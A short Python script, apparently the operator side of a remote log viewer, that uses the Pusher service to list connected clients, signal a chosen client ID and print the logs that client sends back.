from env import *
import pusher
import pysher
import sys


client = pusher.Pusher(
    app_id=app_id,
    key=key,
    secret=secret,
    cluster=cluster,
    ssl=True
)
receiver = pysher.Pusher(key=key, cluster=cluster)


def on_logs(data):
    print("Logs: " + data)


def handle_connection_to_server(connection):
    print("Connected to server")
    print("Server returned: " + str(connection))
    print("Available client IDs: " +
          str(list(client.channels_info(prefix_filter='admin-')['channels']))
          .replace('admin-', '').replace('[', '').replace(']', '').replace("'", ''))
    client_id = int(input("Enter id to connect: "))
    client.trigger('admin-' + str(client_id), 'connection_from_admin', None)
    print("Sent connection message to client")
    log_channel = receiver.subscribe('client-' + str(client_id))
    log_channel.bind('logs', on_logs)


if __name__ == '__main__':
    receiver.connection.bind('pusher:connection_established', handle_connection_to_server)
    receiver.connect()
    while True:
        pass
